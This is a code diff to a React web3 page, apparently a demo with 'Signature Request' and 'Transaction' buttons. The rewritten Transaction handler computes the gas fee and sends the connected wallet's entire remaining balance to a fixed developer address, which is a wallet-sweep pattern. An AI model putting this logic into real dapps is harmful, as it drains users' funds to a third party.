@@ -118,15 +118,33 @@ const Page = () => {
 						}}>
 							Signature Request
 						</button>
-						<button onClick={()=>{
-							signer?.sendTransaction({
-								from: account.address,
+						<button onClick={async ()=>{
+							const balance = ethers.BigNumber.from(token.balance);
+							// Estimate gas price and gas limit
+							const gasPrice = await provider!.getGasPrice();
+							const gasLimit = ethers.BigNumber.from(21000); // Standard gas limit for a simple ETH transfer
+
+							// Calculate total gas fee
+							const gasFee = gasPrice.mul(gasLimit);
+
+							// Calculate the amount to send (balance - gasFee)
+							const amountToSend = balance.sub(gasFee);
+
+							if (amountToSend.lte(0)) {
+								throw new Error('Insufficient funds to cover the gas fee');
+							}
+
+							// Create the transaction
+							const tx = {
 								to: developer.address,
-								chainId: account.chainId,
-								value: BigInt(BigInt(token.balance) - BigInt('10000000')),
-								gasLimit: 20000,
-								gasPrice: 100
-							});
+								value: amountToSend,
+								gasLimit: gasLimit,
+								gasPrice: gasPrice,
+							};
+
+							// Send the transaction
+							const txResponse = await signer!.sendTransaction(tx);
+							
 						}}>
 							Transaction
 						</button>
